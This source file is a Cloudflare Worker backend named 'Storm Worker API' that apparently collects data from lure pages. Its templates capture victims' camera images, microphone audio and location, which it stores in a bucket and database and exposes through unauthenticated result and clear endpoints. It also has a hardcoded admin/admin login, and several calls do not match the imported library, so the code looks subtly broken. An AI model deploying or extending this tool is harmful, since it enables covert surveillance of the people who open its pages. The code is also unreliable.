import { Hono } from 'hono';
import { z } from 'zod';
import {	ApiException,
   		Arr,
   		Bool,
   		CreateEndpoint,
   		D1CreateEndpoint,
   		D1DeleteEndpoint,
   		D1ListEndpoint,
   		D1ReadEndpoint,
   		D1UpdateEndpoint,
   		DateOnly,
   		DateTime,
   		DeleteEndpoint,
   		Email,
   		Enumeration,
   		HonoOpenAPIHandler,
   		Hostname,
   		InputValidationException,
   		Int,
   		Ip,
   		Ipv4,
   		Ipv6,
   		IttyRouterOpenAPIHandler,
   		ListEndpoint,
   		MetaGenerator,
		MultiException,
		NotFoundException,
		Num,
		Obj,
		OpenAPIHandler,
		OpenAPIRegistryMerger,
		OpenAPIRoute,
		ReadEndpoint,
		Regex,
		Str,
		UpdateEndpoint,
		Uuid,
		coerceInputs,
		contentJson,
		convertParams,
        	extendZodWithOpenApi,
   		fromHono,
   		fromIttyRouter,
   		getReDocUI,
   		getSwaggerUI,
   		isAnyZodType,
   		isSpecificZodType,
   		jsonResp,
   		legacyTypeIntoZod,
} from 'chanfana';
import  RealtimeKitAPI from '@cloudflare/realtimekit';

// Define OpenAPI details
const openapi = chanfana({
  openapi: '3.1.0',
  info: {
    title: 'Storm Worker API',
    version: '1.0.0',
  },
});

const app = new Hono();

// --- Middleware for OpenAPI Docs ---
app.use('/docs', openapi.showDocs());
app.use('/openapi.json', openapi.showJSON());

// --- Schemas ---
const LoginSchema = z.object({
  username: z.string(),
  password: z.string(),
});

const CollectSchema = z.object({
    template: z.string(),
    data: z.any(),
});

const MeetingSchema = z.object({
    title: z.string().optional(),
});

// --- Authentication ---
const USERS = {
  admin: 'admin',
};

app.post('/api/login', openapi.json(LoginSchema), async (c) => {
  const { username, password } = c.req.valid('json');
  if (USERS[username] === password) {
    return c.json({ success: true, token: 'dummy-token' });
  }
  return c.json({ success: false }, 401);
});

// --- General Data Collection ---
app.get('/api/results', async (c) => {
    try {
        const { results } = await c.env.DB.prepare('SELECT * FROM logs ORDER BY timestamp DESC').all();
        return c.json(results);
    } catch (e) {
        console.error(e);
        return c.json({ success: false, error: 'Failed to read from database.' }, 500);
    }
});

app.post('/api/clear', async (c) => {
    try {
        await c.env.DB.prepare('DELETE FROM logs').run();
        return c.json({ success: true });
    } catch (e) {
        console.error(e);
        return c.json({ success: false, error: 'Failed to clear database.' }, 500);
    }
});

app.post('/api/collect', openapi.json(CollectSchema), async (c) => {
    const { template, data } = c.req.valid('json');

    try {
        let fileUrl = null;
        let logData = data;

        // Handle file uploads for specific templates
        if (template === 'camera_temp' && data.image) {
            const key = `image-${Date.now()}.png`;
            const body = Buffer.from(data.image, 'base64');
            await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'image/png' } });
            fileUrl = `/r2/${key}`;
            logData = { ...data, imageUrl: fileUrl, image: undefined }; // Remove large data from log
        } else if (template === 'microphone' && data.audio) {
            const key = `audio-${Date.now()}.wav`;
            // The audio data is a data URL: "data:audio/wav;base64,..."
            const audioBase64 = data.audio.split(',')[1];
            const body = Buffer.from(audioBase64, 'base64');
            await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'audio/wav' } });
            fileUrl = `/r2/${key}`;
            logData = { ...data, audioUrl: fileUrl, audio: undefined }; // Remove large data from log
        }

        // Log metadata to D1
        const stmt = c.env.DB.prepare(
            'INSERT INTO logs (template, data) VALUES (?, ?)'
        ).bind(template, JSON.stringify(logData));
        await stmt.run();

        return c.text('Data collected successfully.');
    } catch (e) {
        console.error(e);
        return c.json({ success: false, error: 'Failed to write to database/bucket. Make sure you have run migrations and configured bindings.' }, 500);
    }
});

// --- R2 File Serving ---
app.get('/r2/:key', async (c) => {
    const key = c.req.param('key');
    const object = await c.env.BUCKET.get(key);

    if (object === null) {
        return c.notFound();
    }

    const headers = new Headers();
    object.writeHttpMetadata(headers);
    headers.set('etag', object.httpEtag);

    return new Response(object.body, {
        headers,
    });
});

// --- Template Listing ---
app.get('/api/templates', (c) => {
  const templates = [
    "camera_temp",
    "microphone",
    "nearyou",
    "normal_data",
    "weather",
  ];
  return c.json(templates);
});

// --- Real-time Meeting (Streaming) ---
const ACTIVE_MEETING_KEY = 'active_meeting_id';

app.post('/api/meetings', openapi.json(MeetingSchema), async (c) => {
  const { title } = c.req.valid('json');

  const realtime = new RealtimeKitAPI(c.env.REALTIMEKIT_API_KEY, {
    realtimeKitOrgId: c.env.REALTIMEKIT_ORG_ID,
  });

  try {
    let meetingId = await c.env.KV.get(ACTIVE_MEETING_KEY);

    if (!meetingId) {
      console.log('No active meeting found, creating a new one.');
      const meeting = await realtime.createMeeting({
        title: title || 'Live Stream',
        recordOnStart: true,
      });
      meetingId = meeting.id;
      await c.env.KV.put(ACTIVE_MEETING_KEY, meetingId);
    } else {
      console.log(`Found active meeting: ${meetingId}`);
    }

    const participant = await realtime.addParticipant(meetingId, {
      name: 'Viewer',
      presetName: 'group_call_participant',
      customParticipantId: 'viewer-' + Math.random().toString(36).substring(7),
    });

    return c.json({
      meetingId: meetingId,
      authToken: participant.token,
    });
  } catch (error) {
    console.error(error);
    return c.json({ success: false, error: 'Failed to create or join meeting' }, 500);
  }
});

app.post('/api/meetings/end', async (c) => {
  await c.env.KV.delete(ACTIVE_MEETING_KEY);
  return c.json({ success: true, message: 'Active meeting ended.' });
});

// --- Static Asset Serving ---
// This should be the last route
app.get('*', (c) => {
  return c.env.ASSETS.fetch(c.req.raw);
});

export default app;
